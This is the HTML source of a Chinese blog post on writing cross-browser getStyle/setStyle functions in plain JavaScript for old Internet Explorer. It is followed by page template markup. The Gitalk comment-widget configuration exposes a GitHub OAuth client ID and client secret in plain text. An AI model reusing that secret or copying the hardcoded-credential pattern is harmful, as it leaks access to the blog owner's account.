<span class="nt">&lt;p&gt;</span>因此在 IE 环境下，我们需要针对透明度做一些处理。先写一个 IE 下获取透明度的方法：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// IE 下获取透明度  ``function` `getIEOpacity(elem) {``  ``var` `filter = ``null``;` `  ``// 早期的 IE 中要设置透明度有两个方法：``  ``// 1、alpha(opacity=0)``  ``// 2、filter:progid:DXImageTransform.Microsoft.gradient( GradientType= 0 , startColorstr = ‘#ccccc’, endColorstr = ‘#ddddd’ );``  ``// 利用正则匹配``  ``filter = elem.style.filter.match(/progid:DXImageTransform.Microsoft.Alpha\(.?opacity=(.*).?\)/i) || elem.style.filter.match(/alpha\(opacity=(.*)\)/i);` `  ``if` `(filter) {``    ``var` `value = parseFloat(filter);``    ``if` `(!isNaN(value)) {``      ``// 转化为标准结果``      ``return` `value ? value / 100 : 0;``    ``}``  ``}``  ``// 透明度的值默认返回 1``  ``return` `1;``}
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"float-样式的获取"</span><span class="nt">&gt;&lt;strong&gt;</span>float 样式的获取<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>float 属性是比较重要的一个属性，但是由于 float 是 ECMAScript 的一个保留字。（<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://www.w3school.com.cn/js/pro_js_reservedwords.asp"</span><span class="nt">&gt;</span>ECMAScript保留字有哪些？戳这里<span class="nt">&lt;/a&gt;</span>）<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>所以在各浏览器中都会有代替的写法，比如说在标准浏览器中为 cssFloat，而在 IE678 中为 styleFloat 。经测试，在标准浏览器中直接使用 getPropertyValue(“float”) 也可以获取到 float 的值。而 IE678 则不行，所以针对 float ，也需要一个 HACK。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"width--height-样式的获取"</span><span class="nt">&gt;&lt;strong&gt;</span>width | height 样式的获取<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;table&gt;</span>
  <span class="nt">&lt;tbody&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>然后是元素的高宽，对于一个没有设定高宽的元素而言，在 IE678 下使用 getPropertyValue(“width<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>height”) 得到的是 auto 。而标准浏览器会直接返回它的 px 值，当然我们希望在 IE 下也返回 px 值。<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/tbody&gt;</span>
<span class="nt">&lt;/table&gt;</span>

<span class="nt">&lt;p&gt;</span>这里的 HACK 方法是使用 element.getBoundingClientRect() 方法。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>element.getBoundingClientRect() –<span class="nt">&lt;/strong&gt;</span> 可以获得元素四个点相对于文档视图左上角的值 top、left、bottom、right ，通过计算就可以容易地获得准确的元素大小。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"获取样式的驼峰表示法"</span><span class="nt">&gt;&lt;strong&gt;</span>获取样式的驼峰表示法<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>上文已经提及了，在IE下使用 currentStyle 要获得属性名的话必须采用驼峰式的写法。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>OK，需要 HACK 的点已经提完了。那么在 IE 下，获取样式的写法：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>getStyle: ``function``(elem, style) {``  ``// 主流浏览器``  ``if` `(win.getComputedStyle) {``    ``...``  ``// 不支持 getComputedStyle``  ``} ``else` `{``    ``// IE 下获取透明度``    ``if` `(style == ``"opacity"``) {``      ``getIEOpacity(elem);``    ``// IE687 下获取浮动使用 styleFloat``    ``} ``else` `if` `(style == ``"float"``) {``      ``return` `elem.currentStyle.getAttribute(``"styleFloat"``);``        ``// 取高宽使用 getBoundingClientRect``    ``} ``else` `if` `((style == ``"width"` `|| style == ``"height"``) <span class="ni">&amp;amp;&amp;amp;</span> (elem.currentStyle[style] == ``"auto"``)) {``      ``var` `clientRect = elem.getBoundingClientRect();` `      ``return` `(style == ``"width"` `? clientRect.right - clientRect.left : clientRect.bottom - clientRect.top) + ``"px"``;``    ``}``    ``// 其他样式，无需特殊处理``    ``return` `elem.currentStyle.getAttribute(camelize(style));``  ``}``}
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"setstyleelem-style-value"</span><span class="nt">&gt;&lt;strong&gt;</span>set<span class="nt">&lt;/strong&gt;&lt;strong&gt;</span>Style(elem, style, value)<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>说完 get ，再说说 setStyle ，相较于getStyle ，setStyle 则便捷很多，因为不管是标准浏览器还是 IE ，都可以使用 element.style.cssText 对元素进行样式的设置。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>cssText –<span class="nt">&lt;/strong&gt;</span> 一种设置 CSS 样式的方法，但是它是一个销毁原样式并重建的过程，这种销毁和重建，会增加浏览器的开销。而且在 IE 中，如果 cssText（假如不为空)，最后一个分号会被删掉，所以我们需要在其中添加的属性前加上一个 ”;”  。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>只是在 IE 下的 opacity 需要额外的进行处理。明了易懂，直接贴代码：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// 设置样式``setStyle: ``function``(elem, style, value) {``  ``// 如果是设置 opacity ，需要特殊处理``  ``if` `(style == ``"opacity"``) {``    ``//IE7 bug:filter 滤镜要求 hasLayout=true 方可执行（否则没有效果）``    ``if` `(!elem.currentStyle || !elem.currentStyle.hasLayout) {``      ``// 设置 hasLayout=true 的一种方法``      ``elem.style.zoom = 1;``    ``}``    ``// IE678 设置透明度叫 filter ，不是 opacity``    ``style = ``"filter"``;` `    ``// !!转换为 boolean 类型进行判断``    ``if` `(!!window.XDomainRequest) {``      ``value = ``"progid:DXImageTransform.Microsoft.Alpha(style=0,opacity="` `+ value * 100 + ``")"``;``    ``} ``else` `{``      ``value = ``"alpha(opacity="` `+ value * 100 + ``")"``    ``}``  ``}``  ``// 通用方法``  ``elem.style.cssText += ``';'` `+ (style + ``":"` `+ value);``}
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;</span>到这里，原生 JS 实现的 getStyle 与 setStyle 就实现了，<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://github.com/chokcoco/cssControl/blob/master/cssControl.1.0.0.js"</span><span class="nt">&gt;</span>完整的代码可以戳这里查看<span class="nt">&lt;/a&gt;</span>。可以看到，一个简单接口的背后，都是有涉及了很多方面东西。虽然浏览器兼容性是一个坑，但是爬坑的过程却是我们沉淀自己的最好时机。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>jQuery 这样的框架可以帮助我们走的更快，但是毫无疑问，去弄清底层实现，掌握原生 JS 的写法，可以让我们走得更远。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>原创文章，文笔有限，才疏学浅，文中若有不正之处，万望告知。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>如果本文对你有帮助，请点下推荐，写文章不容易。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>最后，本文组件示例的代码贴在 <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://github.com/chokcoco/cssControl"</span><span class="nt">&gt;</span>我的github<span class="nt">&lt;/a&gt;</span> 上。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>我在 github 上关于 jQuery 源码的全文注解，感兴趣的可以围观一下。<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://github.com/chokcoco/jQuery-"</span><span class="nt">&gt;</span>jQuery v1.10.2 源码注解 <span class="nt">&lt;/a&gt;</span>。<span class="nt">&lt;/p&gt;</span>


                <span class="nt">&lt;hr</span> <span class="na">style=</span><span class="s">"visibility: hidden;"</span><span class="nt">&gt;</span>

                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"pager"</span><span class="nt">&gt;</span>
                    
                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"previous"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/2020/10/12/splice-slice/"</span> <span class="na">data-toggle=</span><span class="s">"tooltip"</span> <span class="na">data-placement=</span><span class="s">"top"</span> <span class="na">title=</span><span class="s">"splice slice"</span><span class="nt">&gt;</span>
                        Previous<span class="nt">&lt;br&gt;</span>
                        <span class="nt">&lt;span&gt;</span>splice slice<span class="nt">&lt;/span&gt;</span>
                        <span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                    
                    
                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"next"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/2020/10/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%E4%B8%80-%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB/"</span> <span class="na">data-toggle=</span><span class="s">"tooltip"</span> <span class="na">data-placement=</span><span class="s">"top"</span> <span class="na">title=</span><span class="s">"前端安全系列（一）如何防止XSS攻击"</span><span class="nt">&gt;</span>
                        Next<span class="nt">&lt;br&gt;</span>
                        <span class="nt">&lt;span&gt;</span>前端安全系列（一）如何防止XSS攻击<span class="nt">&lt;/span&gt;</span>
                        <span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                    
                <span class="nt">&lt;/ul&gt;</span>


                <span class="c">&lt;!--Gitalk评论start  --&gt;</span>
                
                <span class="c">&lt;!-- 引入Gitalk评论插件  --&gt;</span>
                <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://unpkg.com/gitalk/dist/gitalk.css"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://unpkg.com/gitalk@latest/dist/gitalk.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"gitalk-container"</span><span class="nt">&gt;&lt;/div&gt;</span>
                <span class="c">&lt;!-- 引入一个生产md5的js，用于对id值进行处理，防止其过长 --&gt;</span>
                <span class="c">&lt;!-- Thank DF:https://github.com/NSDingFan/NSDingFan.github.io/issues/3#issuecomment-407496538 --&gt;</span>
                <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/js/md5.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
                    <span class="kd">var</span> <span class="nx">gitalk</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Gitalk</span><span class="p">({</span>
                    <span class="na">clientID</span><span class="p">:</span> <span class="dl">'</span><span class="s1">b070bb95e57a3650e202</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">clientSecret</span><span class="p">:</span> <span class="dl">'</span><span class="s1">8420656a991994ea4aa65c2249b6583d6a4c4c54</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">repo</span><span class="p">:</span> <span class="dl">'</span><span class="s1">tian-guo-guo.github.io</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">owner</span><span class="p">:</span> <span class="dl">'</span><span class="s1">tian-guo-guo</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">admin</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">tian-guo-guo</span><span class="dl">'</span><span class="p">],</span>
                    <span class="na">distractionFreeMode</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
                    <span class="na">id</span><span class="p">:</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">pathname</span><span class="p">),</span>
                    <span class="p">});</span>
                    <span class="nx">gitalk</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">gitalk-container</span><span class="dl">'</span><span class="p">);</span>
                <span class="nt">&lt;/script&gt;</span>
                
                <span class="c">&lt;!-- Gitalk end --&gt;</span>

                

            <span class="nt">&lt;/div&gt;</span>  

    <span class="c">&lt;!-- Side Catalog Container --&gt;</span>
        
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-2 col-lg-offset-0
                visible-lg-block
                sidebar-container
                catalog-container"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"side-catalog"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"hidden-sm hidden-xs"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;h5&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"catalog-toggle"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>CATALOG<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/h5&gt;</span>
                    <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"catalog-body"</span><span class="nt">&gt;&lt;/ul&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        

    <span class="c">&lt;!-- Sidebar Container --&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container"</span><span class="nt">&gt;</span>

                <span class="c">&lt;!-- Featured Tags --&gt;</span>
                
                <span class="nt">&lt;section&gt;</span>
                    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"hidden-sm hidden-xs"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;h5&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/tags/"</span><span class="nt">&gt;</span>FEATURED TAGS<span class="nt">&lt;/a&gt;&lt;/h5&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"tags"</span><span class="nt">&gt;</span>
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#技术"</span> <span class="na">title=</span><span class="s">"技术"</span> <span class="na">rel=</span><span class="s">"50"</span><span class="nt">&gt;</span>
                                    技术
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#python"</span> <span class="na">title=</span><span class="s">"python"</span> <span class="na">rel=</span><span class="s">"102"</span><span class="nt">&gt;</span>
                                    python
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#nlp"</span> <span class="na">title=</span><span class="s">"nlp"</span> <span class="na">rel=</span><span class="s">"59"</span><span class="nt">&gt;</span>
                                    nlp
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#paper"</span> <span class="na">title=</span><span class="s">"paper"</span> <span class="na">rel=</span><span class="s">"60"</span><span class="nt">&gt;</span>
                                    paper
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#机器翻译"</span> <span class="na">title=</span><span class="s">"机器翻译"</span> <span class="na">rel=</span><span class="s">"57"</span><span class="nt">&gt;</span>
                                    机器翻译
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#专利"</span> <span class="na">title=</span><span class="s">"专利"</span> <span class="na">rel=</span><span class="s">"17"</span><span class="nt">&gt;</span>
                                    专利
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#新能源"</span> <span class="na">title=</span><span class="s">"新能源"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    新能源
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#pytorch"</span> <span class="na">title=</span><span class="s">"pytorch"</span> <span class="na">rel=</span><span class="s">"9"</span><span class="nt">&gt;</span>
                                    pytorch
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#学习日记"</span> <span class="na">title=</span><span class="s">"学习日记"</span> <span class="na">rel=</span><span class="s">"39"</span><span class="nt">&gt;</span>
                                    学习日记
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#github"</span> <span class="na">title=</span><span class="s">"github"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    github
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#numpy"</span> <span class="na">title=</span><span class="s">"numpy"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    numpy
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#娱乐"</span> <span class="na">title=</span><span class="s">"娱乐"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    娱乐
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#钢琴"</span> <span class="na">title=</span><span class="s">"钢琴"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    钢琴
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#读书笔记"</span> <span class="na">title=</span><span class="s">"读书笔记"</span> <span class="na">rel=</span><span class="s">"14"</span><span class="nt">&gt;</span>
                                    读书笔记
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#道德经"</span> <span class="na">title=</span><span class="s">"道德经"</span> <span class="na">rel=</span><span class="s">"7"</span><span class="nt">&gt;</span>
                                    道德经
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#迁移学习"</span> <span class="na">title=</span><span class="s">"迁移学习"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    迁移学习
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#硅谷来信"</span> <span class="na">title=</span><span class="s">"硅谷来信"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    硅谷来信
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#爬虫"</span> <span class="na">title=</span><span class="s">"爬虫"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    爬虫
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#服务器"</span> <span class="na">title=</span><span class="s">"服务器"</span> <span class="na">rel=</span><span class="s">"22"</span><span class="nt">&gt;</span>
                                    服务器
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#算法"</span> <span class="na">title=</span><span class="s">"算法"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    算法
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Scikit-Learn"</span> <span class="na">title=</span><span class="s">"Scikit-Learn"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    Scikit-Learn
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#术语"</span> <span class="na">title=</span><span class="s">"术语"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    术语
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#领域适应"</span> <span class="na">title=</span><span class="s">"领域适应"</span> <span class="na">rel=</span><span class="s">"12"</span><span class="nt">&gt;</span>
                                    领域适应
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#低资源机器翻译"</span> <span class="na">title=</span><span class="s">"低资源机器翻译"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    低资源机器翻译
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#预训练模型"</span> <span class="na">title=</span><span class="s">"预训练模型"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    预训练模型
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Shell"</span> <span class="na">title=</span><span class="s">"Shell"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    Shell
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#论文投稿"</span> <span class="na">title=</span><span class="s">"论文投稿"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    论文投稿
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#语料库"</span> <span class="na">title=</span><span class="s">"语料库"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    语料库
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#bugs"</span> <span class="na">title=</span><span class="s">"bugs"</span> <span class="na">rel=</span><span class="s">"18"</span><span class="nt">&gt;</span>
                                    bugs
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#饮食"</span> <span class="na">title=</span><span class="s">"饮食"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    饮食
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#数据增强"</span> <span class="na">title=</span><span class="s">"数据增强"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    数据增强
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#LeetCode"</span> <span class="na">title=</span><span class="s">"LeetCode"</span> <span class="na">rel=</span><span class="s">"67"</span><span class="nt">&gt;</span>
                                    LeetCode
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#命名实体识别"</span> <span class="na">title=</span><span class="s">"命名实体识别"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    命名实体识别
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#tensorflow"</span> <span class="na">title=</span><span class="s">"tensorflow"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    tensorflow
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#数据库"</span> <span class="na">title=</span><span class="s">"数据库"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    数据库
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#咨询"</span> <span class="na">title=</span><span class="s">"咨询"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    咨询
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Offer"</span> <span class="na">title=</span><span class="s">"Offer"</span> <span class="na">rel=</span><span class="s">"42"</span><span class="nt">&gt;</span>
                                    Offer
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#LaTeX"</span> <span class="na">title=</span><span class="s">"LaTeX"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    LaTeX
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#前端"</span> <span class="na">title=</span><span class="s">"前端"</span> <span class="na">rel=</span><span class="s">"11"</span><span class="nt">&gt;</span>
                                    前端
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#面试"</span> <span class="na">title=</span><span class="s">"面试"</span> <span class="na">rel=</span><span class="s">"11"</span><span class="nt">&gt;</span>
                                    面试
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
        			<span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/section&gt;</span>
                

                <span class="c">&lt;!-- Friends Blog --&gt;</span>
                
                <span class="nt">&lt;hr&gt;</span>
                <span class="nt">&lt;h5&gt;</span>FRIENDS<span class="nt">&lt;/h5&gt;</span>
                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"list-inline"</span><span class="nt">&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://i.csdn.net/#/uc/profile"</span><span class="nt">&gt;</span>CSDN·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://www.meipai.com/user/1088601139?client_id=1089857299&amp;gid=1119354961&amp;uid=1088601139&amp;utm_user_id=1088601139&amp;utm_content=test&amp;utm_source=meipai_share&amp;utm_term=meipai_ios"</span><span class="nt">&gt;</span>美拍·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://show.gotokeep.com/users/573d84f646054cc85d430037?utm_source=wechat&amp;utm_medium=web&amp;utm_campaign=client_share&amp;utm_term=&amp;utm_content=users"</span><span class="nt">&gt;</span>Keep·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://www.douban.com/people/102650670/"</span><span class="nt">&gt;</span>豆瓣·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                <span class="nt">&lt;/ul&gt;</span>
                
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/article&gt;</span>






<span class="c">&lt;!-- async load function --&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="kd">function</span> <span class="k">async</span><span class="p">(</span><span class="nx">u</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nb">document</span><span class="p">,</span> <span class="nx">t</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">,</span>
